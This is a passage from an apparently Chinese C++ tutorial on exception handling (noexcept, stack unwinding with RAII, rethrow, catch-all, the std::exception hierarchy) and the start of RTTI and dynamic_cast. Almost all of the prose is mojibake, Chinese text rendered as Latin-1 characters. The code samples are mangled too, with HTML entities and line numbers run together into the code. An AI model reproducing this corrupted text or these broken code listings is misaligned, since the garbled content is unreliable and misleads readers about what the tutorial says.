éš¾ä»¥ä½¿ç”¨å¼‚å¸¸è§„èŒƒã€‚ ç»´æŠ¤æˆæœ¬é«˜ï¼Œä¿®æ”¹åº•å±‚å‡½æ•°å¯èƒ½éœ€è¦æ›´æ–°æ•´ä¸ªè°ƒç”¨é“¾çš„å¼‚å¸¸è§„èŒƒã€‚ C++11 çš„æ”¹å˜: åºŸå¼ƒ throw(...) è§„èŒƒ: C++11 åºŸå¼ƒäº†é™¤ throw() ä¹‹å¤–çš„åŠ¨æ€å¼‚å¸¸è§„èŒƒã€‚ å¼•å…¥ noexcept: C++11 å¼•å…¥äº† noexcept è¯´æ˜ç¬¦ï¼Œç”¨äºæ˜ç¡®è¡¨ç¤ºå‡½æ•°ä¿è¯ä¸æŠ›å‡ºä»»ä½•å¼‚å¸¸ã€‚ void func_no_throw() noexcept; // ä¿è¯ä¸æŠ›å‡º void func_maybe_throw(); // å¯èƒ½æŠ›å‡º (åŒ C++98 é»˜è®¤) noexcept è¿˜å¯ä»¥å¸¦ä¸€ä¸ªå¸¸é‡è¡¨è¾¾å¼å‚æ•°ï¼šnoexcept(expression)ã€‚å¦‚æœè¡¨è¾¾å¼ä¸º trueï¼Œåˆ™å‡½æ•°ä¿è¯ä¸æŠ›å‡ºï¼›å¦‚æœä¸º falseï¼Œåˆ™å¯èƒ½æŠ›å‡ºã€‚ throw() ç­‰ä»·äº noexcept(true): ç©ºçš„ throw() è§„èŒƒåœ¨ C++11 ä¸­è¢«è§†ä¸ºç­‰åŒäº noexcept(true)ã€‚ è¿å noexcept: å¦‚æœä¸€ä¸ªå£°æ˜ä¸º noexcept çš„å‡½æ•°å®é™…ä¸ŠæŠ›å‡ºäº†å¼‚å¸¸ï¼Œç¨‹åºä¼šè°ƒç”¨ std::terminate()ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ ˆè§£é€€æ¥æŸ¥æ‰¾å¤„ç†ç¨‹åºã€‚è¿™ä½¿å¾— noexcept æˆä¸ºä¸€ä¸ªæ›´å¼ºçš„ä¿è¯ï¼Œç¼–è¯‘å™¨å¯ä»¥åˆ©ç”¨å®ƒè¿›è¡Œä¼˜åŒ–ã€‚ å»ºè®®: ä¸è¦ä½¿ç”¨ C++11 åºŸå¼ƒçš„åŠ¨æ€å¼‚å¸¸è§„èŒƒ throw(Type1, Type2)ã€‚ å¦‚æœå‡½æ•°ç¡®å®èƒ½ä¿è¯ä¸æŠ›å‡ºå¼‚å¸¸ï¼Œæˆ–è€…å³ä½¿æŠ›å‡ºä¹Ÿåº”è§†ä¸ºä¸¥é‡é”™è¯¯å¯¼è‡´ç¨‹åºç»ˆæ­¢ï¼Œè¯·ä½¿ç”¨ noexceptã€‚è¿™å¯¹ç§»åŠ¨æ„é€ å‡½æ•°ã€ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦å’Œææ„å‡½æ•°å°¤å…¶é‡è¦ï¼Œå› ä¸ºæ ‡å‡†åº“çš„æŸäº›æ“ä½œï¼ˆå¦‚ std::vector é‡æ–°åˆ†é…å†…å­˜ï¼‰ä¾èµ–äºè¿™äº›æ“ä½œçš„ noexcept ä¿è¯æ¥æä¾›å¼ºå¼‚å¸¸å®‰å…¨ä¿è¯ã€‚ å¦‚æœå‡½æ•°å¯èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œçœç•¥ noexcept (æˆ–ä½¿ç”¨ noexcept(false))ã€‚ 15.3.6 æ ˆè§£é€€ (Stack Unwinding)å½“å¼‚å¸¸è¢«æŠ›å‡ºæ—¶ï¼Œç¨‹åºä¼šæš‚åœå½“å‰å‡½æ•°çš„æ‰§è¡Œï¼Œå¹¶å¼€å§‹æ²¿ç€å‡½æ•°è°ƒç”¨é“¾åå‘æŸ¥æ‰¾åŒ¹é…çš„ catch å—ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå·²ç»æ‰§è¡Œå®Œæ¯•çš„å‡½æ•°ï¼ˆä» try å—å¼€å§‹åˆ° throw ç‚¹ï¼‰ä¼šä¾æ¬¡é€€å‡ºï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸º**æ ˆè§£é€€ (Stack Unwinding)**ã€‚ å…³é”®ç‚¹: åœ¨æ ˆè§£é€€è¿‡ç¨‹ä¸­ï¼Œå‡½æ•°è°ƒç”¨æ ˆä¸Šåˆ›å»ºçš„å±€éƒ¨å¯¹è±¡ä¼šæŒ‰ç…§å…¶æ„é€ ç›¸åçš„é¡ºåºè¢«é”€æ¯ï¼Œå³å®ƒä»¬çš„ææ„å‡½æ•°ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ è¿™å°±æ˜¯ RAII (Resource Acquisition Is Initialization) æ¨¡å¼ä¸å¼‚å¸¸å¤„ç†ååŒå·¥ä½œçš„å…³é”®ã€‚å¦‚æœèµ„æºï¼ˆå¦‚åŠ¨æ€å†…å­˜ã€æ–‡ä»¶å¥æŸ„ã€é”ï¼‰ç”±å±€éƒ¨å¯¹è±¡ï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆ std::unique_ptr, æ–‡ä»¶æµ std::ofstream, é”å®ˆå« std::lock_guardï¼‰åœ¨å…¶ç”Ÿå‘½å‘¨æœŸå†…ç®¡ç†ï¼Œé‚£ä¹ˆå³ä½¿å‘ç”Ÿå¼‚å¸¸ï¼Œå½“æ ˆè§£é€€å¯¼è‡´è¿™äº›å±€éƒ¨å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå®ƒä»¬çš„ææ„å‡½æ•°ä¹Ÿä¼šè¢«è°ƒç”¨ï¼Œä»è€Œç¡®ä¿èµ„æºè¢«æ­£ç¡®é‡Šæ”¾ã€‚ 123456789101112131415161718192021222324#include &lt;memory&gt; // for std::unique_ptr#include &lt;stdexcept&gt;void process_resource() &#123; std::unique_ptr&lt;int&gt; p_res(new int(10)); // RAII: èµ„æºç”± unique_ptr ç®¡ç† // ... ä½¿ç”¨ p_res ... if (/* some error condition */ true) &#123; throw std::runtime_error(&quot;Something went wrong in process_resource&quot;); &#125; // ... æ›´å¤šä»£ç  ...&#125; // å¦‚æœæ­£å¸¸ç»“æŸï¼Œp_res åœ¨è¿™é‡Œé”€æ¯ï¼Œé‡Šæ”¾å†…å­˜ // å¦‚æœæŠ›å‡ºå¼‚å¸¸ï¼Œæ ˆè§£é€€æ—¶ p_res ä¹Ÿä¼šè¢«é”€æ¯ï¼Œé‡Šæ”¾å†…å­˜void caller() &#123; try &#123; process_resource(); &#125; catch (const std::runtime_error&amp; e) &#123; // å¤„ç†å¼‚å¸¸ &#125;&#125; æ³¨æ„: å¦‚æœåœ¨æ ˆè§£é€€è¿‡ç¨‹ä¸­ï¼ŒæŸä¸ªå¯¹è±¡çš„ææ„å‡½æ•°è‡ªèº«æŠ›å‡ºäº†å¼‚å¸¸ï¼Œè€Œæ­¤æ—¶å·²ç»æœ‰ä¸€ä¸ªå¼‚å¸¸æ­£åœ¨å¤„ç†ä¸­ï¼Œç¨‹åºä¼šè°ƒç”¨ std::terminate()ã€‚å› æ­¤ï¼Œææ„å‡½æ•°åº”è¯¥é¿å…æŠ›å‡ºå¼‚å¸¸ï¼ˆé€šå¸¸åº”å£°æ˜ä¸º noexceptï¼‰ã€‚ 15.3.7 å…¶ä»–å¼‚å¸¸ç‰¹æ€§ é‡æ–°æŠ›å‡ºå¼‚å¸¸ (throw;): åœ¨ catch å—å†…éƒ¨ï¼Œå¯ä»¥ä½¿ç”¨ä¸å¸¦ä»»ä½•æ“ä½œæ•°çš„ throw; è¯­å¥å°†å½“å‰æ•è·åˆ°çš„å¼‚å¸¸é‡æ–°æŠ›å‡ºï¼Œäº¤ç”±å¤–å±‚çš„ catch å—å¤„ç†ã€‚è¿™å…è®¸ä¸€ä¸ª catch å—æ‰§è¡Œéƒ¨åˆ†å¤„ç†ï¼ˆå¦‚è®°å½•æ—¥å¿—ï¼‰ï¼Œç„¶åå°†å¼‚å¸¸ä¼ é€’ç»™æ›´é«˜å±‚è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ã€‚ 12345678catch (const MyException&amp; e) &#123; log_error(e.what()); // è®°å½•é”™è¯¯ if (can_handle_partially(e)) &#123; // ... éƒ¨åˆ†å¤„ç† ... &#125; else &#123; throw; // é‡æ–°æŠ›å‡ºåŸå§‹å¼‚å¸¸ï¼Œè®©å¤–å±‚å¤„ç† &#125;&#125; æ•è·æ‰€æœ‰å¼‚å¸¸ (catch(...)): catch(...) å¯ä»¥æ•è·ä»»ä½•ç±»å‹çš„å¼‚å¸¸ã€‚å®ƒé€šå¸¸æ”¾åœ¨æ‰€æœ‰å…¶ä»– catch å—çš„æœ€åï¼Œç”¨äºè¿›è¡Œæœ€ç»ˆçš„æ¸…ç†æˆ–è®°å½•æœªçŸ¥é”™è¯¯ã€‚åœ¨ catch(...) å—å†…éƒ¨æ— æ³•çŸ¥é“æ•è·åˆ°çš„å¼‚å¸¸çš„å…·ä½“ç±»å‹å’Œä¿¡æ¯ï¼ˆé™¤éé‡æ–°æŠ›å‡ºç»™å¤–å±‚ï¼‰ã€‚ 12345catch (...) &#123; std::cerr &lt;&lt; &quot;Caught an unexpected exception type!\\n&quot;; // å¯èƒ½è¿›è¡Œä¸€äº›é€šç”¨æ¸…ç† // throw; // å¯ä»¥é‡æ–°æŠ›å‡ºï¼Œå¦‚æœå¤–å±‚å¯èƒ½çŸ¥é“å¦‚ä½•å¤„ç†&#125; 15.3.8 exception ç±»C++ æ ‡å‡†åº“åœ¨ &lt;exception&gt; å¤´æ–‡ä»¶ä¸­å®šä¹‰äº†ä¸€ä¸ªæ ‡å‡†çš„å¼‚å¸¸åŸºç±» std::exceptionã€‚æ ‡å‡†åº“æŠ›å‡ºçš„è®¸å¤šå¼‚å¸¸ï¼ˆå¦‚ std::bad_alloc, std::bad_cast, std::runtime_error, std::logic_error ç­‰ï¼‰éƒ½ç›´æ¥æˆ–é—´æ¥ä»æ­¤ç±»æ´¾ç”Ÿã€‚ std::exception æä¾›äº†ä¸€ä¸ªé‡è¦çš„è™šæˆå‘˜å‡½æ•°ï¼š virtual const char* what() const noexcept; è¿”å›ä¸€ä¸ªæè¿°å¼‚å¸¸çš„ C é£æ ¼å­—ç¬¦ä¸²ã€‚æ´¾ç”Ÿç±»é€šå¸¸ä¼šè¦†ç›–æ­¤æ–¹æ³•ä»¥æä¾›æ›´å…·ä½“çš„é”™è¯¯ä¿¡æ¯ã€‚ å»ºè®®è‡ªå®šä¹‰çš„å¼‚å¸¸ç±»ä¹Ÿç»§æ‰¿è‡ª std::exception æˆ–å…¶æ´¾ç”Ÿç±»ï¼Œè¿™æ ·å¯ä»¥æ›´å®¹æ˜“åœ°ä¸æ ‡å‡†åº“å¼‚å¸¸å’Œé€šç”¨çš„å¼‚å¸¸å¤„ç†ä»£ç é›†æˆã€‚ 12345678910111213141516171819#include &lt;stdexcept&gt; // åŒ…å« runtime_error, logic_error ç­‰#include &lt;string&gt;class MyLogicError : public std::logic_error &#123;public: explicit MyLogicError(const std::string&amp; what_arg) : std::logic_error(what_arg) &#123;&#125; // what() ä¼šç»§æ‰¿ std::logic_error çš„å®ç°ï¼Œè¿”å›æ„é€ æ—¶ä¼ å…¥çš„å­—ç¬¦ä¸²&#125;;int main() &#123; try &#123; throw MyLogicError(&quot;Custom logic error occurred&quot;); &#125; catch (const std::exception&amp; e) &#123; // æ•è·æ‰€æœ‰æ ‡å‡†å¼‚å¸¸åŠæ´¾ç”Ÿç±» std::cerr &lt;&lt; &quot;Caught standard exception: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; &#125; return 0;&#125; æ ‡å‡†å¼‚å¸¸ç±»å±‚æ¬¡ç»“æ„ï¼ˆéƒ¨åˆ†ï¼‰ï¼š 12345678910111213141516std::exception â”œâ”€â”€ std::logic_error â”‚ â”œâ”€â”€ std::domain_error â”‚ â”œâ”€â”€ std::invalid_argument â”‚ â”œâ”€â”€ std::length_error â”‚ â””â”€â”€ std::out_of_range â”œâ”€â”€ std::runtime_error â”‚ â”œâ”€â”€ std::overflow_error â”‚ â”œâ”€â”€ std::underflow_error â”‚ â”œâ”€â”€ std::range_error â”‚ â””â”€â”€ std::system_error (C++11) â”œâ”€â”€ std::bad_alloc (new å¤±è´¥) â”œâ”€â”€ std::bad_cast (dynamic_cast åˆ°å¼•ç”¨å¤±è´¥) â”œâ”€â”€ std::bad_typeid (typeid ç”¨äºç©ºæŒ‡é’ˆ) â””â”€â”€ std::bad_exception (å¤„ç† unexpected() æ—¶å¯èƒ½æŠ›å‡º) ... 15.3.9 å¼‚å¸¸ã€ç±»å’Œç»§æ‰¿å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸ç±»å’Œç»§æ‰¿è‰¯å¥½åœ°äº¤äº’ï¼š ç±»å¯¹è±¡ä½œä¸ºå¼‚å¸¸: å¦‚å‰æ‰€è¿°ï¼Œæ¨èä½¿ç”¨ç±»å¯¹è±¡ã€‚ ç»§æ‰¿å±‚æ¬¡: å¯ä»¥æ•è·åŸºç±»å¼‚å¸¸æ¥å¤„ç†æ´¾ç”Ÿç±»å¼‚å¸¸ã€‚ æ„é€ å‡½æ•°ä¸­çš„å¼‚å¸¸: å¦‚æœæ„é€ å‡½æ•°åœ¨å¯¹è±¡å®Œå…¨æ„é€ å¥½ä¹‹å‰æŠ›å‡ºå¼‚å¸¸ï¼Œè¯¥å¯¹è±¡çš„ææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ã€‚ä½†æ˜¯ï¼Œå·²ç»å®Œå…¨æ„é€ å¥½çš„æˆå‘˜å¯¹è±¡å’ŒåŸºç±»å­å¯¹è±¡çš„ææ„å‡½æ•°ä¼šæŒ‰ç…§æ„é€ ç›¸åçš„é¡ºåºè¢«è°ƒç”¨ï¼ˆæ ˆè§£é€€çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚å› æ­¤ï¼Œæ„é€ å‡½æ•°éœ€è¦ç‰¹åˆ«æ³¨æ„èµ„æºç®¡ç†ï¼Œæœ€å¥½ä½¿ç”¨ RAII æˆå‘˜ï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆï¼‰æ¥é¿å…èµ„æºæ³„æ¼ã€‚ ææ„å‡½æ•°ä¸­çš„å¼‚å¸¸: ææ„å‡½æ•°ä¸åº”è¯¥æŠ›å‡ºå¼‚å¸¸ã€‚å¦‚æœææ„å‡½æ•°åœ¨æ ˆè§£é€€è¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œä¼šå¯¼è‡´ std::terminate()ã€‚å¦‚æœææ„å‡½æ•°å†…éƒ¨çš„æ“ä½œå¯èƒ½å¤±è´¥ï¼Œåº”å°†å¤±è´¥ä¿¡æ¯è®°å½•ä¸‹æ¥æˆ–æä¾›å…¶ä»–æŸ¥è¯¢æ–¹å¼ï¼Œè€Œä¸æ˜¯æŠ›å‡ºå¼‚å¸¸ã€‚ 15.3.10 å¼‚å¸¸ä½•æ—¶ä¼šè¿·å¤±æ–¹å‘ (Uncaught Exceptions)å¦‚æœä¸€ä¸ªå¼‚å¸¸è¢«æŠ›å‡ºåï¼Œæ²¿ç€è°ƒç”¨æ ˆä¸€ç›´ä¼ æ’­åˆ° main å‡½æ•°ä¹‹å¤–éƒ½æ²¡æœ‰è¢«ä»»ä½• catch å—æ•è·ï¼Œè¿™ä¸ªå¼‚å¸¸å°±ç§°ä¸º**æœªæ•è·å¼‚å¸¸ (Uncaught Exception)**ã€‚ å½“å‘ç”Ÿæœªæ•è·å¼‚å¸¸æ—¶ï¼ŒC++ è¿è¡Œæ—¶ç³»ç»Ÿä¼šè°ƒç”¨ std::terminate() å‡½æ•°ï¼ˆå®šä¹‰åœ¨ &lt;exception&gt; ä¸­ï¼‰ã€‚std::terminate() çš„é»˜è®¤è¡Œä¸ºæ˜¯è°ƒç”¨ std::abort()ï¼Œå¯¼è‡´ç¨‹åºå¼‚å¸¸ç»ˆæ­¢ã€‚ å¯ä»¥é€šè¿‡ std::set_terminate() å‡½æ•°æ¥æ³¨å†Œä¸€ä¸ªè‡ªå®šä¹‰çš„ç»ˆæ­¢å¤„ç†ç¨‹åºï¼Œåœ¨ std::terminate() è¢«è°ƒç”¨æ—¶æ‰§è¡Œä¸€äº›è‡ªå®šä¹‰æ“ä½œï¼ˆå¦‚è®°å½•æ—¥å¿—ï¼‰ï¼Œä½†è¿™ä¸ªè‡ªå®šä¹‰å¤„ç†ç¨‹åºæœ€ç»ˆä¹Ÿå¿…é¡»ç»ˆæ­¢ç¨‹åºï¼ˆä¾‹å¦‚é€šè¿‡è°ƒç”¨ abort() æˆ– exit()ï¼‰ï¼Œä¸èƒ½è¿”å›ã€‚ 15.3.11 æœ‰å…³å¼‚å¸¸çš„æ³¨æ„äº‹é¡¹ æ€§èƒ½: å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼ˆç‰¹åˆ«æ˜¯ throw å’Œæ ˆè§£é€€ï¼‰é€šå¸¸æ¯”è¿”å›é”™è¯¯ç æœ‰æ›´é«˜çš„è¿è¡Œæ—¶å¼€é”€ã€‚å› æ­¤ï¼Œå¼‚å¸¸åº”è¯¥ç”¨äºå¤„ç†å¼‚å¸¸æƒ…å†µï¼Œè€Œä¸æ˜¯ç”¨äºæ­£å¸¸çš„ç¨‹åºæµç¨‹æ§åˆ¶ã€‚å¯¹äºé¢„æœŸä¼šé¢‘ç¹å‘ç”Ÿçš„â€œé”™è¯¯â€ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥æ ¼å¼é”™è¯¯ï¼‰ï¼Œå¯èƒ½ä½¿ç”¨é”™è¯¯ç æˆ–å…¶ä»–æ–¹å¼æ›´åˆé€‚ã€‚ å¼‚å¸¸å®‰å…¨ (Exception Safety): ç¼–å†™åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶ä»èƒ½ä¿æŒæ­£ç¡®çŠ¶æ€ï¼ˆä¾‹å¦‚ï¼Œä¸æ³„æ¼èµ„æºã€ä¿æŒæ•°æ®ä¸€è‡´æ€§ï¼‰çš„ä»£ç éå¸¸é‡è¦ã€‚RAII æ˜¯å®ç°å¼‚å¸¸å®‰å…¨çš„å…³é”®æŠ€æœ¯ã€‚å‡½æ•°é€šå¸¸è¿½æ±‚ä»¥ä¸‹å‡ ç§å¼‚å¸¸å®‰å…¨ä¿è¯çº§åˆ«ï¼ˆä»å¼±åˆ°å¼ºï¼‰ï¼š åŸºæœ¬ä¿è¯ (Basic Guarantee): æ“ä½œå¤±è´¥æ—¶ï¼Œå¯¹è±¡ä¿æŒåœ¨æŸä¸ªæœ‰æ•ˆçŠ¶æ€ï¼ˆä¸ä¸€å®šå’Œæ“ä½œå‰ç›¸åŒï¼‰ï¼Œæ²¡æœ‰èµ„æºæ³„æ¼ã€‚ å¼ºä¿è¯ (Strong Guarantee): æ“ä½œå¤±è´¥æ—¶ï¼Œå¯¹è±¡çš„çŠ¶æ€å›æ»šåˆ°æ“ä½œå¼€å§‹ä¹‹å‰çš„çŠ¶æ€ï¼ˆäº‹åŠ¡æ€§ï¼‰ã€‚ ä¸æŠ›å‡ºä¿è¯ (Nothrow Guarantee): æ“ä½œä¿è¯ä¸ä¼šæŠ›å‡ºä»»ä½•å¼‚å¸¸ (noexcept)ã€‚ ææ„å‡½æ•°: ç»å¯¹ä¸è¦è®©ææ„å‡½æ•°æŠ›å‡ºå¼‚å¸¸ã€‚ æ„é€ å‡½æ•°: è°¨æ…å¤„ç†æ„é€ å‡½æ•°ä¸­çš„å¼‚å¸¸ï¼Œä½¿ç”¨ RAII ç®¡ç†èµ„æºã€‚ ä½•æ—¶ä½¿ç”¨: å¼‚å¸¸æœ€é€‚åˆå¤„ç†é‚£äº›é˜»æ­¢å‡½æ•°å®Œæˆå…¶é¢„æœŸä»»åŠ¡çš„ã€ä¸å¸¸è§çš„é”™è¯¯æƒ…å†µï¼Œç‰¹åˆ«æ˜¯å½“é”™è¯¯å‘ç”Ÿåœ¨æ·±å±‚åµŒå¥—è°ƒç”¨ä¸­ï¼Œéœ€è¦å°†é”™è¯¯ä¿¡æ¯ä¼ é€’ç»™é«˜å±‚è°ƒç”¨è€…æ—¶ã€‚ å¼‚å¸¸å¤„ç†æ˜¯ C++ ä¸­ä¸€ä¸ªå¼ºå¤§çš„é”™è¯¯å¤„ç†å·¥å…·ï¼Œä½†ä¹Ÿéœ€è¦è°¨æ…ä½¿ç”¨ï¼Œå¹¶ç»“åˆ RAII ç­‰æŠ€æœ¯æ¥ç¡®ä¿ç¨‹åºçš„å¥å£®æ€§å’Œèµ„æºçš„æ­£ç¡®ç®¡ç†ã€‚ 15.4 RTTIï¼ˆè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼‰RTTI æ˜¯ Runtime Type Identification çš„ç¼©å†™ï¼Œå³è¿è¡Œæ—¶ç±»å‹è¯†åˆ«ã€‚å®ƒæ˜¯ C++ çš„ä¸€é¡¹æœºåˆ¶ï¼Œå…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶å‘ç°å’Œä½¿ç”¨å¯¹è±¡çš„å®é™…ç±»å‹ä¿¡æ¯ã€‚ é€šå¸¸ï¼Œæˆ‘ä»¬é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨æ¥æ“ä½œæ´¾ç”Ÿç±»å¯¹è±¡ï¼ˆå¤šæ€ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç åªå…³å¿ƒå¯¹è±¡æ˜¯å¦ç¬¦åˆåŸºç±»å®šä¹‰çš„æ¥å£ã€‚ä½†æœ‰æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦çŸ¥é“æŒ‡é’ˆæˆ–å¼•ç”¨å®é™…æŒ‡å‘çš„å¯¹è±¡çš„ç¡®åˆ‡æ´¾ç”Ÿç±»å‹ï¼Œä»¥ä¾¿æ‰§è¡Œè¯¥æ´¾ç”Ÿç±»ç‰¹æœ‰çš„æ“ä½œã€‚RTTI å°±æ˜¯ä¸ºäº†è§£å†³è¿™ç±»é—®é¢˜è€Œè®¾è®¡çš„ã€‚ RTTI ä¸»è¦é€šè¿‡ä»¥ä¸‹ä¸‰ä¸ªå…ƒç´ å®ç°ï¼š dynamic_cast&lt;&gt; è¿ç®—ç¬¦: ç”¨äºåœ¨ç±»å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œ**å®‰å…¨çš„å‘ä¸‹è½¬æ¢ (Downcasting)**ã€‚å®ƒå¯ä»¥å°†åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è½¬æ¢ä¸ºæ´¾ç”Ÿç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œå¹¶åœ¨è½¬æ¢æ— æ•ˆæ—¶æä¾›æ˜ç¡®çš„å¤±è´¥æŒ‡ç¤ºã€‚ typeid() è¿ç®—ç¬¦: è¿”å›ä¸€ä¸ªæŒ‡å‘ std::type_info å¯¹è±¡çš„å¼•ç”¨ï¼Œè¯¥å¯¹è±¡åŒ…å«äº†å…³äºæ“ä½œæ•°ç±»å‹çš„ä¿¡æ¯ï¼ˆå¦‚ç±»å‹åç§°ï¼‰ã€‚ std::type_info ç±»: å­˜å‚¨ç‰¹å®šç±»å‹ä¿¡æ¯çš„ç±»ã€‚å…¶å…·ä½“å†…å®¹å› ç¼–è¯‘å™¨è€Œå¼‚ï¼Œä½†æ ‡å‡†ä¿è¯å®ƒæœ‰ä¸€ä¸ª name() æ–¹æ³•è¿”å›ç±»å‹çš„åç§°å­—ç¬¦ä¸²ï¼Œå¹¶å¯ä»¥æ¯”è¾ƒä¸¤ä¸ª type_info å¯¹è±¡æ˜¯å¦ç›¸ç­‰ã€‚ æ³¨æ„: RTTI ä¸»è¦ç”¨äºå…·æœ‰è™šå‡½æ•°çš„ç±»å±‚æ¬¡ç»“æ„ï¼ˆå³å¤šæ€ç±»ï¼‰ã€‚å¯¹äºæ²¡æœ‰è™šå‡½æ•°çš„ç±»ï¼ŒRTTI çš„åŠŸèƒ½ä¼šå—åˆ°é™åˆ¶ï¼ˆç‰¹åˆ«æ˜¯ dynamic_cast å¯¹æŒ‡é’ˆçš„æ“ä½œå’Œ typeid å¯¹è§£å¼•ç”¨æŒ‡é’ˆçš„æ“ä½œï¼‰ã€‚ç¼–è¯‘å™¨é€šå¸¸é€šè¿‡è™šå‡½æ•°è¡¨ (vtable) æ¥å­˜å‚¨ RTTI æ‰€éœ€çš„ä¿¡æ¯ã€‚ 15.4.1 RTTI çš„ç”¨é€”RTTI ä¸»è¦ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š å®‰å…¨çš„å‘ä¸‹è½¬æ¢: å½“ä½ æœ‰ä¸€ä¸ªåŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œå¹¶ä¸”ä½ æ€€ç–‘å®ƒå¯èƒ½æŒ‡å‘æŸä¸ªç‰¹å®šçš„æ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½ æƒ³å®‰å…¨åœ°å°†å…¶è½¬æ¢ä¸ºè¯¥æ´¾ç”Ÿç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œä»¥ä¾¿è°ƒç”¨æ´¾ç”Ÿç±»ç‰¹æœ‰çš„æ–¹æ³•ã€‚ ç±»å‹ç›¸å…³çš„ç‰¹æ®Šå¤„ç†: æ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹æ‰§è¡Œä¸åŒçš„é€»è¾‘åˆ†æ”¯ã€‚ æ›¿ä»£æ–¹æ¡ˆ: åº”è¯¥ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨è™šå‡½æ•°æ¥å®ç°å¤šæ€è¡Œä¸ºã€‚å¦‚æœä¸åŒçš„æ´¾ç”Ÿç±»éœ€è¦ä»¥ä¸åŒçš„æ–¹å¼æ‰§è¡ŒæŸä¸ªæ“ä½œï¼Œé€šå¸¸æ›´å¥½çš„è®¾è®¡æ˜¯å®šä¹‰ä¸€ä¸ªè™šå‡½æ•°ï¼Œè®©æ¯ä¸ªæ´¾ç”Ÿç±»æä¾›è‡ªå·±çš„å®ç°ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ RTTI æ¥åˆ¤æ–­ç±»å‹å¹¶æ‰‹åŠ¨è°ƒç”¨ä¸åŒçš„ä»£ç ã€‚RTTI å¾€å¾€è¢«è§†ä¸ºä¸€ç§æœ€åçš„æ‰‹æ®µï¼Œæˆ–è€…åœ¨ç‰¹å®šæ¡†æ¶ï¼ˆå¦‚å›¾å½¢ç•Œé¢åº“ä¸­çš„äº‹ä»¶å¤„ç†ï¼‰ä¸­å¯èƒ½æ›´å¸¸ç”¨ã€‚è¿‡åº¦ä½¿ç”¨ RTTI å¯èƒ½è¡¨æ˜ç±»è®¾è®¡å­˜åœ¨é—®é¢˜ã€‚ 15.4.2 RTTI çš„å·¥ä½œåŸç†1. dynamic_cast&lt;&gt; è¿ç®—ç¬¦dynamic_cast ç”¨äºåœ¨ç»§æ‰¿å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œç±»å‹è½¬æ¢ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿è¡Œæ—¶æ£€æŸ¥è½¬æ¢çš„æœ‰æ•ˆæ€§ã€‚ è¯­æ³•: æŒ‡é’ˆè½¬æ¢: dynamic_cast&lt;TargetType*&gt;(source_pointer) å¼•ç”¨è½¬æ¢: dynamic_cast&lt;TargetType&amp;&gt;(source_reference) è¡Œä¸º: å‘ä¸Šè½¬æ¢ (Upcasting): å°†æ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨è½¬æ¢ä¸ºåŸºç±»æŒ‡é’ˆ/å¼•ç”¨ã€‚dynamic_cast å¯ä»¥æ‰§è¡Œæ­¤æ“ä½œï¼Œä½†é€šå¸¸ä¸éœ€è¦ï¼Œå› ä¸ºéšå¼è½¬æ¢å³å¯ã€‚ å‘ä¸‹è½¬æ¢ (Downcasting): å°†åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è½¬æ¢ä¸ºæ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨ã€‚è¿™æ˜¯ dynamic_cast çš„ä¸»è¦ç”¨é€”ã€‚ å‰æ: åŸºç±»å¿…é¡»åŒ…å«è‡³å°‘ä¸€ä¸ªè™šå‡½æ•°ï¼ˆå³æ˜¯å¤šæ€åŸºç±»ï¼‰ï¼Œdynamic_cast æ‰èƒ½æ‰§è¡Œè¿è¡Œæ—¶çš„å‘ä¸‹è½¬æ¢æ£€æŸ¥ã€‚å¦‚æœåŸºç±»æ²¡æœ‰è™šå‡½æ•°ï¼Œdynamic_cast ç”¨äºå‘ä¸‹è½¬æ¢æ—¶é€šå¸¸ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼ˆæˆ–è¡Œä¸ºç±»ä¼¼ static_castï¼Œä¸å®‰å…¨ï¼‰ã€‚ æŒ‡é’ˆè½¬æ¢: å¦‚æœ source_pointer ç¡®å®æŒ‡å‘ä¸€ä¸ª TargetType ç±»å‹çš„å¯¹è±¡ï¼ˆæˆ–è€…æ˜¯ TargetType çš„æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œåˆ™è½¬æ¢æˆåŠŸï¼Œè¿”å›æŒ‡å‘è¯¥å¯¹è±¡çš„ TargetType* æŒ‡é’ˆã€‚ å¦‚æœ source_pointer æŒ‡å‘çš„å¯¹è±¡ä¸æ˜¯ TargetType ç±»å‹ï¼ˆæˆ–å…¶æ´¾ç”Ÿç±»ï¼‰ï¼Œæˆ–è€… source_pointer æ˜¯ nullptrï¼Œåˆ™è½¬æ¢å¤±è´¥ï¼Œè¿”å› **nullptr**ã€‚ 